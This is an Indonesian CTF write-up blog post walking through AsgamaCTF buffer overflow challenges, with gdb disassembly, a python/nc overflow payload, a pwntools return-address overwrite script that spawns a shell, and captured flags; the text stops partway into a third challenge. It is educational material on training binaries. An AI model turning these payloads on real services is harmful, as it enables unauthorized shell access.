<!DOCTYPE html>
<html lang="en">

<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
<link rel="stylesheet" href="/assets/css/style.css">
<title>AsgamaCTF Binary Exploit Write-Up</title>
<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>AsgamaCTF Binary Exploit Write-Up | Abdullahnz’s Notes</title>
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="AsgamaCTF Binary Exploit Write-Up" />
<meta name="author" content="abdullahnz" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="AsgamaCTF adalah platform yang disediakan oleh Universitas Gajah Maja untuk bahan pembelajaran yang ditargetkan untuk umum. Adapun berikut jenis-jenis soal yang disediakan, sebagai berikut:" />
<meta property="og:description" content="AsgamaCTF adalah platform yang disediakan oleh Universitas Gajah Maja untuk bahan pembelajaran yang ditargetkan untuk umum. Adapun berikut jenis-jenis soal yang disediakan, sebagai berikut:" />
<link rel="canonical" href="http://localhost:4000/write%20up/ctf/pwn/2020/07/15/write-up-binex-asgama-ctf.html" />
<meta property="og:url" content="http://localhost:4000/write%20up/ctf/pwn/2020/07/15/write-up-binex-asgama-ctf.html" />
<meta property="og:site_name" content="Abdullahnz’s Notes" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-07-15T07:55:05+07:00" />
<script type="application/ld+json">
{"description":"AsgamaCTF adalah platform yang disediakan oleh Universitas Gajah Maja untuk bahan pembelajaran yang ditargetkan untuk umum. Adapun berikut jenis-jenis soal yang disediakan, sebagai berikut:","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/write%20up/ctf/pwn/2020/07/15/write-up-binex-asgama-ctf.html"},"url":"http://localhost:4000/write%20up/ctf/pwn/2020/07/15/write-up-binex-asgama-ctf.html","author":{"@type":"Person","name":"abdullahnz"},"@type":"BlogPosting","headline":"AsgamaCTF Binary Exploit Write-Up","dateModified":"2020-07-15T07:55:05+07:00","datePublished":"2020-07-15T07:55:05+07:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<style>
table {
    margin: auto !important;
    min-width: 500px !important;
}
</style></head>

<body>
  <main class="container">
    <section class="about">
      <a href="/"><img class="profile_image" style="border-radius: 50%;" src="/assets/portfolio.png" alt="Nizam Abdullah"></a>
      <h2 id="title" >
        <a href="/">Nizam Abdullah</a>
      </h2>
      <p class="tagline">Student.</p>
      <ul class="social"><a href="https://github.com/abdullahnz" target="_blank">
          <li>
            <i class="icon-github-circled"></i>
          </li>
        </a><a href="https://instagram.com/abdullahnz_" target="_blank">
          <li>
            <i class="icon-instagram"></i>
          </li>
        </a><a href="https://facebook.com/profile.php?id=100006254298767" target="_blank">
          <li>
            <i class="icon-facebook-squared"></i>
          </li>
        </a><a href=" https://t.me/abdullahnzz" target="_blank">
          <li>
            <i class="icon-telegram"></i>
          </li>
        </a></ul><p>&copy;
        2020</p><div>
        <p>Dark Mode
          <i class="icon-moon"></i>
          <label class="switch">
            <input type="checkbox" id="dark-mode-toggle">
            <span class="slider round" onclick="toggleDarkMode()"></span>
          </label>
        </p>
      </div>
      <script type="text/javascript" src="/assets/js/darkmode.js"></script></section>
    <section class="content">
      <div class="post-container">
  <a class="post-link" href="/write%20up/ctf/pwn/2020/07/15/write-up-binex-asgama-ctf.html">
    <h2 class="post-title">AsgamaCTF Binary Exploit Write-Up</h2>
  </a>
  <div class="post-meta">
    <div class="post-date"><i class="icon-calendar"></i>Jul 15, 2020</div><ul class="post-categories"><li>Write Up</li><li>CTF</li><li>PWN</li></ul></div>
  <div class="post">
    <p>AsgamaCTF adalah platform yang disediakan oleh Universitas Gajah Maja untuk bahan pembelajaran yang ditargetkan untuk umum. Adapun berikut jenis-jenis soal yang disediakan, sebagai berikut:</p>

<ul>
  <li>Web Exploitation</li>
  <li>Forensic</li>
  <li>Cryptography</li>
  <li>Binary Exploitation</li>
  <li>Dan Lain-Lain.</li>
</ul>

<p>Berikut write-up beberapa challenge kategori Binary Exploitation.</p>

<h2 id="buffer1-50-pts">Buffer1 [50 pts]</h2>

<p>Diberikan file <a href="https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/buf2">buf1</a> ELF 32-bit not stripped dan service <code class="language-plaintext highlighter-rouge">nc asgama.web.id 40203</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file buf1 
buf1: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>66a2a0cfb02b03a6abf1e65146da2739e8b17bdd, not stripped
</code></pre></div></div>
<p>Dan berikut hasil disassembly fungsi <code class="language-plaintext highlighter-rouge">main</code> yang ada pada program yang diberikan.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">pdisas</span> <span class="n">main</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="p">:</span>
   <span class="mh">0x08048537</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">ecx</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x0804853b</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>  <span class="ow">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
   <span class="mh">0x0804853e</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ecx</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x08048541</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
   <span class="mh">0x08048542</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x08048544</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ecx</span>
   <span class="mh">0x08048545</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x94</span>
   <span class="mh">0x0804854b</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x8048506</span> <span class="o">&lt;</span><span class="n">init</span><span class="o">&gt;</span>
   <span class="mh">0x08048550</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x0</span>
   <span class="mh">0x08048557</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x0804855a</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x8c</span><span class="p">]</span>
   <span class="mh">0x08048560</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">eax</span>
   <span class="mh">0x08048561</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x8048390</span> <span class="o">&lt;</span><span class="n">gets</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048566</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048569</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x13377331</span>
   <span class="mh">0x08048570</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jne</span>    <span class="mh">0x8048584</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span>
   <span class="mh">0x08048572</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048575</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x8048630</span>
   <span class="mh">0x0804857a</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x80483b0</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x0804857f</span> <span class="o">&lt;+</span><span class="mi">72</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048582</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jmp</span>    <span class="mh">0x8048594</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;</span>
   <span class="mh">0x08048584</span> <span class="o">&lt;+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048587</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="mh">0x804863b</span>
   <span class="mh">0x0804858c</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">call</span>   <span class="mh">0x80483a0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x08048591</span> <span class="o">&lt;+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048594</span> <span class="o">&lt;+</span><span class="mi">93</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
   <span class="mh">0x08048599</span> <span class="o">&lt;+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x0804859c</span> <span class="o">&lt;+</span><span class="mi">101</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">leave</span>  
   <span class="mh">0x0804859d</span> <span class="o">&lt;+</span><span class="mi">102</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">lea</span>    <span class="n">esp</span><span class="p">,[</span><span class="n">ecx</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x080485a0</span> <span class="o">&lt;+</span><span class="mi">105</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</code></pre></div></div>

<p>Program ini menggunakan <code class="language-plaintext highlighter-rouge">gets</code> untuk mengambil inputan kita yang diberi ukuran sebesar <code class="language-plaintext highlighter-rouge">0x8c</code>.</p>

<p>Tujuan kita disini adalah memanggil fungsi <code class="language-plaintext highlighter-rouge">system</code> yang ada pada alamat <code class="language-plaintext highlighter-rouge">0x0804857a</code>. Untuk mencapai <code class="language-plaintext highlighter-rouge">system</code>, ada hal yang perlu dipenuhi dahulu.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x08048569</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="mh">0x13377331</span>
<span class="mh">0x08048570</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">jne</span>    <span class="mh">0x8048584</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>Berikut penjelasan potongan disassembly diatas.</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">cmp</code> diatas berarti apakah value pada <code class="language-plaintext highlighter-rouge">ebp-0xc</code> adalah <code class="language-plaintext highlighter-rouge">0x13377331</code>. Jika tidak, paka program akan loncat ke alamat <code class="language-plaintext highlighter-rouge">0x8048584</code>.
    <blockquote>
      <p>The CMP instruction compares two operands. It is generally used in conditional execution. This instruction basically subtracts one operand from the other for comparing whether the operands are equal or not. It does not disturb the destination or source operands. It is used along with the conditional jump instruction for decision making.</p>
    </blockquote>
  </li>
  <li>Singkatnya, <code class="language-plaintext highlighter-rouge">cmp</code> mempunyai syntax sebagai berikut.
    <div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="n">CMP</span><span class="w"> </span><span class="p">[</span><span class="n">destination</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">source</span><span class="p">]</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ul>

<h3 id="exploit">Exploit</h3>
<p>Inputan kita berada pada <code class="language-plaintext highlighter-rouge">ebp-0x8c</code>. Untuk sampai di <code class="language-plaintext highlighter-rouge">ebc-0xc</code> kita membutuhkan,</p>
<ul>
  <li>Padding berukuran <code class="language-plaintext highlighter-rouge">0x8c - 0xc = 0x80 (128 dalam desimal)</code></li>
  <li>Ditambah dengan <code class="language-plaintext highlighter-rouge">0x13377331</code> dalam <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a>.</li>
</ul>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'print "A"*128 + "\x31\x73\x37\x13"'</span> | nc asgama.web.id 40203
GamaCTF<span class="o">{</span>BufF3rR__0vErf10W__EZ<span class="o">}</span>
</code></pre></div></div>
<h3 id="flag">Flag</h3>
<p><code class="language-plaintext highlighter-rouge">GamaCTF{BufF3rR__0vErf10W__EZ}</code></p>

<h2 id="buffer2-75-pts">Buffer2 [75 pts]</h2>

<p>Diberikan File <a href="https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/buf2">buf2</a> ELF 32-bit not stripped dan service <code class="language-plaintext highlighter-rouge">nc asgama.web.id 40202</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file buf2 
buf2: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>422a2c2391911b03f182ed6a8a2b65ca200f276c, not stripped
</code></pre></div></div>
<p>Dan berikut hasil disassembly fungsi <code class="language-plaintext highlighter-rouge">main</code> yang ada pada program yang diberikan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pdisas main
Dump of assembler code <span class="k">for function </span>main:
   0x0804855d &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x08048561 &lt;+4&gt;:	and    esp,0xfffffff0
   0x08048564 &lt;+7&gt;:	push   DWORD PTR <span class="o">[</span>ecx-0x4]
   0x08048567 &lt;+10&gt;:	push   ebp
   0x08048568 &lt;+11&gt;:	mov    ebp,esp
   0x0804856a &lt;+13&gt;:	push   ecx
   0x0804856b &lt;+14&gt;:	sub    esp,0x4
   0x0804856e &lt;+17&gt;:	call   0x8048545 &lt;hah&gt;
   0x08048573 &lt;+22&gt;:	sub    esp,0xc
   0x08048576 &lt;+25&gt;:	push   0x8048623
   0x0804857b &lt;+30&gt;:	call   0x80483a0 &lt;puts@plt&gt;
   0x08048580 &lt;+35&gt;:	add    esp,0x10
   0x08048583 &lt;+38&gt;:	mov    eax,0x0
   0x08048588 &lt;+43&gt;:	mov    ecx,DWORD PTR <span class="o">[</span>ebp-0x4]
   0x0804858b &lt;+46&gt;:	leave  
   0x0804858c &lt;+47&gt;:	lea    esp,[ecx-0x4]
   0x0804858f &lt;+50&gt;:	ret    
End of assembler dump. 
</code></pre></div></div>
<p>Terlihat pada alamat <code class="language-plaintext highlighter-rouge">0x0804856e</code> fungsi <code class="language-plaintext highlighter-rouge">main</code> memanggil fungsi <code class="language-plaintext highlighter-rouge">hah</code> yang mempunyai vulnerable <em>buffer overflow</em> karena menggunakan <code class="language-plaintext highlighter-rouge">gets</code> untuk mengambil inputan kita seperti soal sebelumnya.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pdisas hah
Dump of assembler code <span class="k">for function </span>hah:
   0x08048545 &lt;+0&gt;:	push   ebp
   0x08048546 &lt;+1&gt;:	mov    ebp,esp
   0x08048548 &lt;+3&gt;:	sub    esp,0x48
   0x0804854b &lt;+6&gt;:	sub    esp,0xc
   0x0804854e &lt;+9&gt;:	lea    eax,[ebp-0x48]
   0x08048551 &lt;+12&gt;:	push   eax
   0x08048552 &lt;+13&gt;:	call   0x8048390 &lt;gets@plt&gt;
   0x08048557 &lt;+18&gt;:	add    esp,0x10
   0x0804855a &lt;+21&gt;:	nop
   0x0804855b &lt;+22&gt;:	leave  
   0x0804855c &lt;+23&gt;:	ret    
End of assembler dump.
</code></pre></div></div>
<h3 id="exploit-1">Exploit</h3>
<p>Program memiliki bug <em>buffer overflow</em> dan kita bisa mengontrol flow jalannya program. Tapi kemana kita arahkan jalur lajunya program ?</p>

<p>Perlu diketahui, ternyata program mempunyai fungsi lain yang beralamat <code class="language-plaintext highlighter-rouge">0x0804851c</code> bernama <code class="language-plaintext highlighter-rouge">debug</code></p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">info</span> <span class="n">functions</span> 
<span class="n">All</span> <span class="n">defined</span> <span class="n">functions</span><span class="p">:</span>

<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span> <span class="n">symbols</span><span class="p">:</span>
<span class="mh">0x08048358</span>  <span class="n">_init</span>
<span class="mh">0x08048390</span>  <span class="n">gets</span><span class="o">@</span><span class="n">plt</span>
<span class="mh">0x080483a0</span>  <span class="n">puts</span><span class="o">@</span><span class="n">plt</span>
<span class="mh">0x080483b0</span>  <span class="n">system</span><span class="o">@</span><span class="n">plt</span>
<span class="mh">0x080483c0</span>  <span class="n">__libc_start_main</span><span class="o">@</span><span class="n">plt</span>
<span class="mh">0x080483d0</span>  <span class="n">setvbuf</span><span class="o">@</span><span class="n">plt</span>
<span class="mh">0x080483e0</span>  <span class="n">__gmon_start__</span><span class="o">@</span><span class="n">plt</span>
<span class="mh">0x080483f0</span>  <span class="n">_start</span>
<span class="mh">0x08048420</span>  <span class="n">__x86</span><span class="p">.</span><span class="n">get_pc_thunk</span><span class="p">.</span><span class="n">bx</span>
<span class="mh">0x08048430</span>  <span class="n">deregister_tm_clones</span>
<span class="mh">0x08048460</span>  <span class="n">register_tm_clones</span>
<span class="mh">0x080484a0</span>  <span class="n">__do_global_dtors_aux</span>
<span class="mh">0x080484c0</span>  <span class="n">frame_dummy</span>
<span class="mh">0x080484eb</span>  <span class="n">init</span>
<span class="mh">0x0804851c</span>  <span class="n">debug</span>
<span class="mh">0x08048545</span>  <span class="n">hah</span>
<span class="mh">0x0804855d</span>  <span class="n">main</span>
<span class="mh">0x08048590</span>  <span class="n">__libc_csu_init</span>
<span class="mh">0x080485f0</span>  <span class="n">__libc_csu_fini</span>
<span class="mh">0x080485f4</span>  <span class="n">_fini</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> 
</code></pre></div></div>

<p>Didalam fungsi ini, kita akan mendapatkan shell, berikut hasil disassemble-nya.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">pdisas</span> <span class="n">debug</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">debug</span><span class="p">:</span>
   <span class="mh">0x0804851c</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">push</span>   <span class="n">ebp</span>
   <span class="mh">0x0804851d</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x0804851f</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
   <span class="mh">0x08048522</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048525</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">push</span>   <span class="mh">0x8048610</span>
   <span class="mh">0x0804852a</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">call</span>   <span class="mh">0x80483a0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x0804852f</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048532</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xc</span>
   <span class="mh">0x08048535</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">push</span>   <span class="mh">0x804861b</span>
   <span class="mh">0x0804853a</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">call</span>   <span class="mh">0x80483b0</span> <span class="o">&lt;</span><span class="n">system</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
   <span class="mh">0x0804853f</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
   <span class="mh">0x08048542</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">nop</span>
   <span class="mh">0x08048543</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">leave</span>  
   <span class="mh">0x08048544</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">ret</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x804861b</span>
<span class="mh">0x804861b</span><span class="p">:</span>	<span class="s">"/bin/sh"</span>
</code></pre></div></div>

<p>Inputan kita berada pada <code class="language-plaintext highlighter-rouge">ebp-0x48</code>. Untuk sampai ke <em>return address</em>, kita harus meng-overwrite <code class="language-plaintext highlighter-rouge">ebp</code></p>
<ul>
  <li>Karena soal ini merupakan file 32 bit, maka harus menambahkan 4 byte padding untuk meng-overwrite <code class="language-plaintext highlighter-rouge">ebp</code> sehingga sampai ke <em>return address</em>.</li>
  <li>Panjang 1 register 32bit adalah 4 byte. Sedangkan dalam 64bit, 1 register memiliki panjang 8 byte.</li>
  <li><em>Return address</em>, yaitu pada alamat fungsi <code class="language-plaintext highlighter-rouge">debug</code> yang akan mengeksekusi shell.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"asgama.web.id"</span><span class="p">,</span> <span class="mi">40202</span><span class="p">)</span>
<span class="n">offset</span>  <span class="o">=</span> <span class="mi">72</span> <span class="o">+</span> <span class="mi">4</span>
<span class="n">debug</span>   <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804851c</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">debug</span>

<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Jalankan dan didapatkan shell.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python solver.py 
<span class="o">[</span>+] Opening connection to asgama.web.id on port 40202: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="nv">$ </span>
<span class="nv">$ </span><span class="nb">ls
</span>buf2
flag
<span class="nv">$ </span><span class="nb">cat </span>flag
GamaCTF<span class="o">{</span>C0ntR0l_Fl0w_H1J4ckiNg<span class="o">}</span>
<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to asgama.web.id port 40202
</code></pre></div></div>
<h3 id="flag-1">Flag</h3>
<p><code class="language-plaintext highlighter-rouge">GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}</code></p>

<h2 id="ez-1-100-pts">EZ 1 [100 pts]</h2>

<p>Diberikan file ELF 32-bit <a href="https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/hoho">hoho</a> not stripped dan service <code class="language-plaintext highlighter-rouge">asgama.web.id:40210</code></p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file hoho
hoho: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>91cf29963d62f9f85d561bb273ed4d7a54b5037b, not stripped
</code></pre></div></div>

<p>Berikut hasil dissasembly fungsi <code class="language-plaintext highlighter-rouge">main</code> yang ada dalam program.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">pdisas</span> <span class="n">main</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">main</span><span class="p">:</span>
   <span class="mh">0x0804851c</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">lea</span>    <span class="n">ecx</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x08048520</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>  <span class="ow">and</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
   <span class="mh">0x08048523</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ecx</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
   <span class="mh">0x08048526</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
